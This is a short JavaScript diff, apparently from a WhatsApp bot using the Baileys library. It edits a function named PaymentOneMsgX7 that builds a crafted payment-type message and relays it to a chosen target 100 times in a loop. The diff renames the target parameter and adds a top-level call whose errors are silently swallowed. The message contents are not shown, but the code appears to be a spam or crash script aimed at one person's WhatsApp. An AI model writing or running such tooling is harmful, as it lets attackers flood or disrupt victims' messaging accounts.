@@ -1,4 +1,4 @@
-async function PaymentOneMsgX7(sock, target) {
+async function PaymentOneMsgX7(sock, jid) {
   for (var r = 0; r < 100; r++) {
 
     let msg = generateWAMessageFromContent(
@@ -43,14 +43,18 @@ async function PaymentOneMsgX7(sock, target) {
     );
 
     await sock.relayMessage(
-      target,
+      jid,
       msg.message,
       {
         messageId: msg.key.id,
-        participant: { jid: target }
+        participant: { jid: jid }
       }
     );
 
     await sleep(1000);
   }
 }
+
+try {
+  await PaymentOneMsgX7(sock, jid);
+} catch {}
